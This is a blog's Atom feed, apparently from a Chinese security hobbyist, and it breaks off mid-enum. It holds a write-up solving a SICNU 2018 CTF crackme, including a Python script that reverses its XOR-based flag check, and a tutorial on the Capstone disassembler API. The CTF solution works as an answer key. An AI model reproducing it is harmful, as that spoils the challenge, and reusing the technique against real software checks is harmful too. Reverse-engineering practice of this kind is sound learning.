<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K&#39;s House</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kabeor.github.io/"/>
  <updated>2019-07-26T04:35:11.665Z</updated>
  <id>https://kabeor.github.io/</id>
  
  <author>
    <name>kabeor</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SICNU-CTF逆向 Sign</title>
    <link href="https://kabeor.github.io/SICNU-CTF%E9%80%86%E5%90%91%20Sign/"/>
    <id>https://kabeor.github.io/SICNU-CTF逆向 Sign/</id>
    <published>2019-07-26T04:27:46.431Z</published>
    <updated>2019-07-26T04:35:11.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SICNU2018-CTF逆向-Sign"><a href="#SICNU2018-CTF逆向-Sign" class="headerlink" title="SICNU2018-CTF逆向 Sign"></a>SICNU2018-CTF逆向 Sign</h1><p>2018年五月川师的比赛题，一直放着没有看，今天清理文件拿出来看一下</p><p>x86,入口jmp一看就是VS编译，无壳无花</p><p>之前一直好奇大佬们是怎样做到秒题的，做完这道才题知道，只有敏锐的洞察力快速定位核心代码才是王道</p><p>main函数<br><img src="https://i.loli.net/2019/07/26/5d3a7c867363016763.jpg" alt></p><p>很显然有两个判断点<br>第一个直接看赋值v5的函数sub_401186，这道题有意思的点在于每个函数都会有一个二次跳转，因此如果不能及时定位到关键点，在限定的时间内很难分析出来<br><img src="https://i.loli.net/2019/07/26/5d3a7d54bc1be16220.jpg" alt><br>非常无用的跳转，一直想拿IDC脚本剔除，但可惜没什么思路<br>进入之后<br><img src="https://i.loli.net/2019/07/26/5d3a7d9d8e6f428329.jpg" alt></p><p>v8限定字符串长度，开头必须是 ‘SICNU{’  ,算上最后一个一定是‘}’，因此我们还要输入16个字符。<br>动态调试发现下面的判断也只判断了输入前6个字符，然后截断，并没有做其他操作</p><p>回到主函数看到第二个判定在v3，直接进入<br><img src="https://i.loli.net/2019/07/26/5d3a7ecb6d76846189.jpg" alt><br><img src="https://i.loli.net/2019/07/26/5d3a7ee02379c25978.jpg" alt></p><p>如图，动态调试发现，v1是对{后的输入每次取一字符，然后和key1密钥表异或，共操作六次<br>v2是剩余字符长度，其中除去反括号还有10个字符，这里sub_401230的功能F5识别出错，直接看汇编<br><img src="https://i.loli.net/2019/07/26/5d3a7ffddfe4436075.jpg" alt><br>rep stosd循环，ecx,11h为循环次数，eax初始0CCCCCCCCh，最后v2为固定值11</p><p>接下来判断是否是数字，是则+17，不是则与key2密钥表异或</p><p>接下来验证答案，要求C1等于key3-v20，C2等于key4-v13，所以写脚本直接反求即可</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a0 = [<span class="number">0xE5</span>, <span class="number">0xA6</span>, <span class="number">0xE4</span>, <span class="number">0xE2</span>, <span class="number">0xD4</span>, <span class="number">0x95</span>, <span class="number">0xEC</span>]</span><br><span class="line">a1 = [ <span class="number">0xFC</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0xC7</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x5D</span>, <span class="number">0x68</span>, <span class="number">0x28</span>, <span class="number">0x3B</span>]</span><br><span class="line">key1 = [<span class="number">0xB2</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0xA1</span>, <span class="number">0xE4</span>, <span class="number">0xF8</span>, <span class="number">0xA9</span>]</span><br><span class="line">key2 = [<span class="number">0xA3</span>, <span class="number">0x45</span>, <span class="number">0xEA</span>, <span class="number">0x35</span>, <span class="number">0x3E</span>, <span class="number">0x26</span>, <span class="number">0x5D</span>, <span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line">C1 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">C1[i]=chr(key1[i]^a0[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"flag:    SICNU&#123;"</span>, end = <span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">print(C1[a], end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">C2 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">C2[i] = a1[j] - <span class="number">17</span></span><br><span class="line"><span class="keyword">if</span>(C2[i]&gt;=<span class="number">48</span> <span class="keyword">and</span> C2[i]&lt;=<span class="number">57</span>):</span><br><span class="line">C2[i] = chr(C2[i])</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">C2[i] = chr(key2[k] ^ a1[j])</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line">k=k+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">print(C2[a], end = <span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>flag<br><img src="https://i.loli.net/2019/07/26/5d3a8138d970b13890.jpg" alt></p><p>From <a href="https://kabeor.github.io/SICNU-CTF逆向 Sign/">https://kabeor.github.io/SICNU-CTF逆向 Sign/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SICNU2018-CTF逆向-Sign&quot;&gt;&lt;a href=&quot;#SICNU2018-CTF逆向-Sign&quot; class=&quot;headerlink&quot; title=&quot;SICNU2018-CTF逆向 Sign&quot;&gt;&lt;/a&gt;SICNU2018-CTF逆向 Sign&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(一)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%B8%80)/"/>
    <id>https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(一)/</id>
    <published>2019-07-20T07:14:11.341Z</published>
    <updated>2019-07-26T04:39:24.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-一"><a href="#Capstone反汇编引擎数据类型及API分析及示例-一" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(一)"></a>Capstone反汇编引擎数据类型及API分析及示例(一)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5753" target="_blank" rel="noopener">https://xz.aliyun.com/t/5753</a></p></blockquote><p>最近准备用开源的反汇编引擎做个项目，研究了OllyDebug的ODDisasm，disasm与assembl部分代码的思想都很值得学习，但毕竟是2000年的产物，指令集只支持x86，也没有对语义的深度分析，于是转向了对Capstone的研究。</p><p>Capstone反汇编引擎可以说是如今世界上最优秀的反汇编引擎，IDA，Radare2，Qemu等著名项目都使用了Capstone Engine，所以选择它来开发是一个不错的选择。<br>但在开发时发现官方并未给出详细API文档，网上也没有类似的分析，因此想到自己阅读源码和试验，由此写出了一个简单的非官方版本的API手册，希望能与大家分享。</p><h2 id="0x0-开发准备"><a href="#0x0-开发准备" class="headerlink" title="0x0 开发准备"></a>0x0 开发准备</h2><p>  Capstone官网： <a href="http://www.capstone-engine.org" target="_blank" rel="noopener">http://www.capstone-engine.org</a></p><h3 id="自行编译lib和dll方法"><a href="#自行编译lib和dll方法" class="headerlink" title="自行编译lib和dll方法"></a>自行编译lib和dll方法</h3><p>  源码： <a href="https://github.com/aquynh/capstone/archive/4.0.1.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/archive/4.0.1.zip</a></p><p>  下载后解压<br>  文件结构如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   .                   &lt;- 主要引擎core engine + README + 编译文档COMPILE.TXT 等</span><br><span class="line">├── arch            &lt;- 各语言反编译支持的代码实现</span><br><span class="line">│   ├── AArch64     &lt;- ARM64 (aka ARMv8) 引擎</span><br><span class="line">│   ├── ARM         &lt;- ARM 引擎</span><br><span class="line">│   ├── EVM         &lt;- Ethereum 引擎</span><br><span class="line">│   ├── M680X       &lt;- M680X 引擎</span><br><span class="line">│   ├── M68K        &lt;- M68K 引擎</span><br><span class="line">│   ├── Mips        &lt;- Mips 引擎</span><br><span class="line">│   ├── PowerPC     &lt;- PowerPC 引擎</span><br><span class="line">│   ├── Sparc       &lt;- Sparc 引擎</span><br><span class="line">│   ├── SystemZ     &lt;- SystemZ 引擎</span><br><span class="line">│   ├── TMS320C64x  &lt;- TMS320C64x 引擎</span><br><span class="line">│   ├── X86         &lt;- X86 引擎</span><br><span class="line">│   └── XCore       &lt;- XCore 引擎</span><br><span class="line">├── bindings        &lt;- 中间件</span><br><span class="line">│   ├── java        &lt;- Java 中间件 + 测试代码</span><br><span class="line">│   ├── ocaml       &lt;- Ocaml 中间件 + 测试代码</span><br><span class="line">│   └── python      &lt;- Python 中间件 + 测试代码</span><br><span class="line">├── contrib         &lt;- 社区代码</span><br><span class="line">├── cstool          &lt;- Cstool 检测工具源码</span><br><span class="line">├── docs            &lt;- 文档，主要是capstone的实现思路</span><br><span class="line">├── include         &lt;- C头文件</span><br><span class="line">├── msvc            &lt;- Microsoft Visual Studio 支持（Windows）</span><br><span class="line">├── packages        &lt;- Linux/OSX/BSD包</span><br><span class="line">├── windows         &lt;- Windows 支持(Windows内核驱动编译)</span><br><span class="line">├── suite           &lt;- Capstone开发测试工具</span><br><span class="line">├── tests           &lt;- C语言测试用例</span><br><span class="line">└── xcode           &lt;- Xcode 支持 (MacOSX 编译)</span><br></pre></td></tr></table></figure></p><p>下面演示Windows10使用Visual Studio2019编译</p><p>复制msvc文件夹到一个比较清爽的位置（强迫症专用），内部结构如下：</p><p><img src="https://i.loli.net/2019/07/20/5d32b771e4c0118081.jpg" alt></p><p>VS打开capstone.sln项目文件，解决方案自动载入这些</p><p><img src="https://i.loli.net/2019/07/20/5d32b810db76b87698.jpg" alt></p><p>可以看到支持的所有语言都在这里了，如果都需要的话，直接编译就好了，只需要其中几种，则右键解决方案-&gt;属性-&gt;配置属性  如下</p><p><img src="https://i.loli.net/2019/07/20/5d32b92a26e1328865.jpg" alt></p><p>生成选项中勾选你需要的支持项即可<br>编译后会在当前文件夹Debug目录下生成capstone.lib静态编译库和capstone.dll动态库这样就可以开始使用Capstone进行开发了</p><p>如果不想自己编译，官方也提供了官方编译版本<br>Win32： <a href="https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win32.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win32.zip</a><br>Win64： <a href="https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win64.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win64.zip</a></p><p>选x32或x64将影响后面开发的位数</p><h3 id="引擎调用测试"><a href="#引擎调用测试" class="headerlink" title="引擎调用测试"></a>引擎调用测试</h3><p>新建一个VS项目，将..\capstone-4.0.1\include\capstone中的头文件以及编译好的lib和dll文件全部拷贝到新建项目的主目录下</p><p><img src="https://i.loli.net/2019/07/20/5d32bbbde025889046.jpg" alt></p><p>在VS解决方案中，头文件添加现有项capstone.h，资源文件中添加capstone.lib，重新生成解决方案</p><p><img src="https://i.loli.net/2019/07/20/5d32bc284c4e175661.jpg" alt></p><p>那么现在来测试一下我们自己的capstone引擎吧</p><p>主文件写入如下代码</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cinttypes&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事实上这是官方给出的C语言开发唯一几个例子之一，但注意到代码cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)，测试的是archx64的反编译，因此编译选项也需要设置为x64，除此以外，如果你的项目像我一样是c++开发，那么printf(“0x%””Ix””:\t%s\t\t%s\n”, insn[j].address, insn[j].mnemonic, insn[j].op_str);处官方给出的”0x%”PRIx64”:\t%s\t\t%s\n”应修改为我这里的”0x%””Ix””:\t%s\t\t%s\n”，这是inttypes支持问题。</p><p>运行结果<br><img src="https://i.loli.net/2019/07/20/5d32ca5adbd7040022.jpg" alt></p><h2 id="0x1-数据类型及API分析"><a href="#0x1-数据类型及API分析" class="headerlink" title="0x1 数据类型及API分析"></a>0x1 数据类型及API分析</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h4><p>用于生成调用capstone API的句柄<br><code>size_t csh</code> </p><blockquote><p>用法： <code>csh handle;</code></p></blockquote><h4 id="cs-arch"><a href="#cs-arch" class="headerlink" title="cs_arch"></a>cs_arch</h4><p>架构选择</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">enum</span> cs_arch &#123;</span><br><span class="line">CS_ARCH_ARM = <span class="number">0</span>,<span class="comment">///&lt; ARM 架构 (包括 Thumb, Thumb-2)</span></span><br><span class="line">CS_ARCH_ARM64,<span class="comment">///&lt; ARM-64, 也叫 AArch64</span></span><br><span class="line">CS_ARCH_MIPS,<span class="comment">///&lt; Mips 架构</span></span><br><span class="line">   CS_ARCH_X86,<span class="comment">///&lt; X86 架构 (包括 x86 &amp; x86-64)</span></span><br><span class="line">CS_ARCH_PPC,<span class="comment">///&lt; PowerPC 架构</span></span><br><span class="line">CS_ARCH_SPARC,<span class="comment">///&lt; Sparc 架构</span></span><br><span class="line">CS_ARCH_SYSZ,<span class="comment">///&lt; SystemZ 架构</span></span><br><span class="line">CS_ARCH_XCORE,<span class="comment">///&lt; XCore 架构</span></span><br><span class="line">CS_ARCH_M68K,<span class="comment">///&lt; 68K 架构</span></span><br><span class="line">CS_ARCH_TMS320C64X,<span class="comment">///&lt; TMS320C64x 架构</span></span><br><span class="line">CS_ARCH_M680X,<span class="comment">///&lt; 680X 架构</span></span><br><span class="line">CS_ARCH_EVM,<span class="comment">///&lt; Ethereum 架构</span></span><br><span class="line">CS_ARCH_MAX,</span><br><span class="line">CS_ARCH_ALL = <span class="number">0xFFFF</span>, <span class="comment">// All 架构 - for cs_support()</span></span><br><span class="line">&#125; cs_arch;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API中cs_arch参数填入枚举内容，如API中cs_open(cs_arch arch, cs_mode mode, csh *handle);第一个参数填CS_ARCH_X86则支持X86 架构</p></blockquote><h4 id="cs-mode"><a href="#cs-mode" class="headerlink" title="cs_mode"></a>cs_mode</h4><p>模式选择</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_mode &#123;</span><br><span class="line">CS_MODE_LITTLE_ENDIAN = <span class="number">0</span>,<span class="comment">///&lt; little-endian 模式 (default 模式)</span></span><br><span class="line">CS_MODE_ARM = <span class="number">0</span>,<span class="comment">///&lt; 32-bit ARM</span></span><br><span class="line">CS_MODE_16 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,<span class="comment">///&lt; 16-bit 模式 (X86)</span></span><br><span class="line">CS_MODE_32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,<span class="comment">///&lt; 32-bit 模式 (X86)</span></span><br><span class="line">CS_MODE_64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,<span class="comment">///&lt; 64-bit 模式 (X86, PPC)</span></span><br><span class="line">CS_MODE_THUMB = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,<span class="comment">///&lt; ARM's Thumb 模式, 包括 Thumb-2</span></span><br><span class="line">CS_MODE_MCLASS = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,<span class="comment">///&lt; ARM's Cortex-M 系列</span></span><br><span class="line">CS_MODE_V8 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,<span class="comment">///&lt; ARM解码方式ARMv8 A32 </span></span><br><span class="line">CS_MODE_MICRO = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; MicroMips 模式 (MIPS)</span></span><br><span class="line">CS_MODE_MIPS3 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; Mips III ISA</span></span><br><span class="line">CS_MODE_MIPS32R6 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; Mips32r6 ISA</span></span><br><span class="line">CS_MODE_MIPS2 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="comment">///&lt; Mips II ISA</span></span><br><span class="line">CS_MODE_V9 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; SparcV9 模式 (Sparc)</span></span><br><span class="line">CS_MODE_QPX = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; Quad Processing eXtensions 模式 (PPC)</span></span><br><span class="line">CS_MODE_M68K_000 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">///&lt; M68K 68000 模式</span></span><br><span class="line">CS_MODE_M68K_010 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">///&lt; M68K 68010 模式</span></span><br><span class="line">CS_MODE_M68K_020 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="comment">///&lt; M68K 68020 模式</span></span><br><span class="line">CS_MODE_M68K_030 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; M68K 68030 模式</span></span><br><span class="line">CS_MODE_M68K_040 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; M68K 68040 模式</span></span><br><span class="line">CS_MODE_M68K_060 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; M68K 68060 模式</span></span><br><span class="line">CS_MODE_BIG_ENDIAN = <span class="number">1</span> &lt;&lt; <span class="number">31</span>,<span class="comment">///&lt; big-endian 模式</span></span><br><span class="line">CS_MODE_MIPS32 = CS_MODE_32,<span class="comment">///&lt; Mips32 ISA (Mips)</span></span><br><span class="line">CS_MODE_MIPS64 = CS_MODE_64,<span class="comment">///&lt; Mips64 ISA (Mips)</span></span><br><span class="line">CS_MODE_M680X_6301 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">///&lt; M680X Hitachi 6301,6303 模式</span></span><br><span class="line">CS_MODE_M680X_6309 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">///&lt; M680X Hitachi 6309 模式</span></span><br><span class="line">CS_MODE_M680X_6800 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="comment">///&lt; M680X Motorola 6800,6802 模式</span></span><br><span class="line">CS_MODE_M680X_6801 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; M680X Motorola 6801,6803 模式</span></span><br><span class="line">CS_MODE_M680X_6805 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; M680X Motorola/Freescale 6805 模式</span></span><br><span class="line">CS_MODE_M680X_6808 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP 68HC08 模式</span></span><br><span class="line">CS_MODE_M680X_6809 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="comment">///&lt; M680X Motorola 6809 模式</span></span><br><span class="line">CS_MODE_M680X_6811 = <span class="number">1</span> &lt;&lt; <span class="number">8</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP 68HC11 模式</span></span><br><span class="line">CS_MODE_M680X_CPU12 = <span class="number">1</span> &lt;&lt; <span class="number">9</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP CPU12</span></span><br><span class="line"><span class="comment">///&lt; 用于 M68HC12/HCS12</span></span><br><span class="line">CS_MODE_M680X_HCS08 = <span class="number">1</span> &lt;&lt; <span class="number">10</span>, <span class="comment">///&lt; M680X Freescale/NXP HCS08 模式</span></span><br><span class="line">&#125; cs_mode;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API中cs_mode参数填入枚举内容，如API中cs_open(cs_arch arch, cs_mode mode, csh *handle);第二个参数填CS_MODE_64则支持X64模式</p></blockquote><h4 id="cs-opt-mem"><a href="#cs-opt-mem" class="headerlink" title="cs_opt_mem"></a>cs_opt_mem</h4><p>内存操作</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mem</span> &#123;</span></span><br><span class="line"><span class="keyword">cs_malloc_t</span> <span class="built_in">malloc</span>;</span><br><span class="line"><span class="keyword">cs_calloc_t</span> <span class="built_in">calloc</span>;</span><br><span class="line"><span class="keyword">cs_realloc_t</span> <span class="built_in">realloc</span>;</span><br><span class="line"><span class="keyword">cs_free_t</span> <span class="built_in">free</span>;</span><br><span class="line"><span class="keyword">cs_vsnprintf_t</span> vsnprintf;</span><br><span class="line">&#125; cs_opt_mem;</span><br></pre></td></tr></table></figure><blockquote><p>用法：可使用用户自定义的malloc/calloc/realloc/free/vsnprintf()函数，默认使用系统自带malloc(), calloc(), realloc(), free() &amp; vsnprintf()</p></blockquote><h4 id="cs-opt-mnem"><a href="#cs-opt-mnem" class="headerlink" title="cs_opt_mnem"></a>cs_opt_mnem</h4><p>自定义助记符</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mnem</span> &#123;</span></span><br><span class="line"><span class="comment">/// 需要自定义的指令ID</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> id;</span><br><span class="line"><span class="comment">/// 自定义的助记符</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *mnemonic;</span><br><span class="line">&#125; cs_opt_mnem;</span><br></pre></td></tr></table></figure><h4 id="cs-opt-type"><a href="#cs-opt-type" class="headerlink" title="cs_opt_type"></a>cs_opt_type</h4><p>反编译的运行时选项</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_opt_type &#123;</span><br><span class="line">CS_OPT_INVALID = <span class="number">0</span>,<span class="comment">///&lt; 无特殊要求</span></span><br><span class="line">CS_OPT_SYNTAX,<span class="comment">///&lt; 汇编输出语法</span></span><br><span class="line">CS_OPT_DETAIL,<span class="comment">///&lt; 将指令结构分解为多个细节</span></span><br><span class="line">CS_OPT_MODE,<span class="comment">///&lt; 运行时改变引擎模式</span></span><br><span class="line">CS_OPT_MEM,<span class="comment">///&lt; 用户定义的动态内存相关函数</span></span><br><span class="line">CS_OPT_SKIPDATA, <span class="comment">///&lt; 在反汇编时跳过数据。然后引擎将处于SKIPDATA模式</span></span><br><span class="line">CS_OPT_SKIPDATA_SETUP, <span class="comment">///&lt; 为SKIPDATA选项设置用户定义函数</span></span><br><span class="line">CS_OPT_MNEMONIC, <span class="comment">///&lt;自定义指令助记符</span></span><br><span class="line">CS_OPT_UNSIGNED, <span class="comment">///&lt; 以无符号形式打印立即操作数</span></span><br><span class="line">&#125; cs_opt_type;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API cs_option(csh handle, cs_opt_type type, size_t value);中第二个参数</p></blockquote><h4 id="cs-opt-value"><a href="#cs-opt-value" class="headerlink" title="cs_opt_value"></a>cs_opt_value</h4><p>运行时选项值(与cs_opt_type关联)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_opt_value &#123;</span><br><span class="line">CS_OPT_OFF = <span class="number">0</span>,  <span class="comment">///&lt; 关闭一个选项 - 默认为CS_OPT_DETAIL, CS_OPT_SKIPDATA, CS_OPT_UNSIGNED.</span></span><br><span class="line">CS_OPT_ON = <span class="number">3</span>, <span class="comment">///&lt; 打开一个选项 (CS_OPT_DETAIL, CS_OPT_SKIPDATA).</span></span><br><span class="line">CS_OPT_SYNTAX_DEFAULT = <span class="number">0</span>, <span class="comment">///&lt; 默认asm语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_INTEL, <span class="comment">///&lt; X86 Intel asm语法 - 默认开启 X86 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_ATT,   <span class="comment">///&lt; X86 ATT 汇编语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_NOREGNAME, <span class="comment">///&lt; 只打印寄存器名和编号 (CS_OPT_SYNTAX)</span></span><br><span class="line">CS_OPT_SYNTAX_MASM, <span class="comment">///&lt; X86 Intel Masm 语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">&#125; cs_opt_value;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API cs_option(csh handle, cs_opt_type type, size_t value);中第三个参数</p></blockquote><h4 id="cs-op-type"><a href="#cs-op-type" class="headerlink" title="cs_op_type"></a>cs_op_type</h4><p>通用指令操作数类型，在所有架构中保持一致</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_op_type &#123;</span><br><span class="line">CS_OP_INVALID = <span class="number">0</span>,  <span class="comment">///&lt; 未初始化/无效的操作数</span></span><br><span class="line">CS_OP_REG,          <span class="comment">///&lt; 寄存器操作数</span></span><br><span class="line">CS_OP_IMM,          <span class="comment">///&lt; 立即操作数</span></span><br><span class="line">CS_OP_MEM,          <span class="comment">///&lt; 内存操作数</span></span><br><span class="line">CS_OP_FP,           <span class="comment">///&lt; 浮点数</span></span><br><span class="line">&#125; cs_op_type;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-ac-type"><a href="#cs-ac-type" class="headerlink" title="cs_ac_type"></a>cs_ac_type</h4><p>通用指令操作数访问类型，在所有架构中保持一致<br>可以组合访问类型，例如:CS_AC_READ | CS_AC_WRITE</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_ac_type &#123;</span><br><span class="line">CS_AC_INVALID = <span class="number">0</span>,        <span class="comment">///&lt; 未初始化/无效的访问类型</span></span><br><span class="line">CS_AC_READ    = <span class="number">1</span> &lt;&lt; <span class="number">0</span>,   <span class="comment">///&lt; 操作数从内存或寄存器中读取</span></span><br><span class="line">CS_AC_WRITE   = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,   <span class="comment">///&lt; 操作数从内存或寄存器中写入</span></span><br><span class="line">&#125; 